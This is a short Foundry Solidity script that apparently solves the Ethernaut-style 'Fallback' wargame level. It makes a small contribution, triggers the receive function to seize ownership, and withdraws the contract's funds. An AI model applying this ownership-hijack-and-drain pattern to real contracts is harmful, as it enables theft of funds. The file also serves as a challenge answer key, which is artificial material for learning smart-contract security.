// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract SolveFallback is Script {

    Fallback public fallbackContract;
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        fallbackContract = Fallback(payable(vm.envAddress("FALLBACK_ADDRESS")));
        // Step 1: Contribute a small amount to become a contributor
        fallbackContract.contribute{value: 0.0005 ether}();
        // Step 2: Send ether to trigger the receive function and become the owner
        (bool success, ) = address(fallbackContract).call{value: 0.0001 ether}("");
        require(success, "Transfer failed");
        // Step 3: Withdraw the funds as the new owner
        fallbackContract.withdraw();
        vm.stopBroadcast();
    }
}
